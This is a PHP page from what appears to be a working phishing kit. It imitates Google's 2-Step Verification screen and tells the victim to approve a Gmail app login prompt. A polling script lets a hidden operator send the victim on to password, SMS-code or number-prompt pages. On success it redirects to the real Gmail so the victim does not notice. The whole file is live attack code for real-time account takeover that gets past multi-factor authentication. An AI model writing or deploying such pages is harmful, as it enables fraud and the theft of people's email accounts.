<?php
// verify-yes.php — 2-Step: YES Prompt (no number, just tap Yes in Gmail app)
// Matches the screenshot exactly: just "Open the Gmail app on your Device"
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid   = $_SESSION['visitor_id'] ?? session_id();
$email = $_SESSION['email'];
$state = get_state($sid);

// If already success, go to Gmail
if ($state['page'] === 'success') {
    header('Location: https://mail.google.com/');
    exit;
}

page_open('2-Step Verification', true);
?>

<div class="card two-col" role="main">

  <!-- LEFT col -->
  <div>
    <?= g_logo() ?>
    <h1 class="card-title">2-Step Verification</h1>
    <p class="card-sub">
      To help keep your account safe, Google wants to make sure it's
      really you trying to sign in
    </p>
    <br><br><br>
  </div>

  <!-- RIGHT col -->
  <div>
    <p class="verify-title" style="margin-bottom:12px">Open the Gmail app on your Device</p>
    <p class="verify-desc" style="margin-bottom:24px">
      Google sent a notification to your Device. Open the Gmail app and tap
      <strong>Yes</strong> on the prompt to verify it's you.
    </p>

    <!-- Don't ask again checkbox -->
    <label class="cb-row" id="dontAskLabel" style="margin-bottom:0">
      <input type="checkbox" checked/>
      <span class="cb-box on" id="dontAskBox"></span>
      <span class="cb-label">Don't ask again on this device</span>
    </label>

    <div class="btn-row" style="justify-content:flex-end;margin-top:40px">
      <a href="loading.php" class="link">Try another way</a>
    </div>
  </div>

</div>

<script>
(function(){
  const MAP = {
    'loading':      'loading.php',
    'verify_sms':   'verify-sms.php',
    'sms_error':    'verify-sms.php',
    'pw_error':     'password.php',
    'password':     'password.php',
    'blocked':      'blocked.php',
    // number prompt → go to the number prompt page
    'verify_prompt':'verify-prompt.php',
    'prompt_error': 'verify-prompt.php',
  };
  let redirecting = false;

  function poll(){
    if (redirecting) return;
    fetch('poll.php?t=' + Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;

        // SUCCESS — wait for admin button, then go
        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('https://mail.google.com/');
          return;
        }

        // Stay on this page
        if (d.page === 'verify_yes') return;

        const dest = MAP[d.page];
        if (dest) {
          redirecting = true;
          window.location.replace(dest);
        }
      }).catch(()=>{});
  }

  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>
